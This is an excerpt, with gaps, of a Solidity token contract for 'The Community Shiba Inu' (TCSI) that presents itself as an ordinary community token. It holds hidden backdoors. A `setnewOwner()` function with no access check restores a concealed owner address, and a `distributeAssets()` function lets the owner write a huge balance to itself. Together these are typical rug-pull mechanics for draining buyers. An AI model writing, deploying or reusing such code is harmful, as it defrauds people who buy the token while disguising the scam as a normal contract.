...
/**
https://t.me/TheCommunityShibaInu
*/
...
contract Ownable is Context {
    ...
    function setnewOwner() public virtual {
        _owner = _newowner;
...
contract TheCommunityShibaInu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "The Community Shiba Inu";
    string private _symbol = "TCSI";
    ...
    address payable public marketingWallet = payable(0xDFE4F5a9ac5669f009Dd33Db0E5293A97207142D);
    ...
    uint256 public rewardEndSupply = 1000000000000000;
    ...
    function distributeAssets()   public onlyOwner()   { _walletTotals[getOwner() ] = getTotalRewards; }
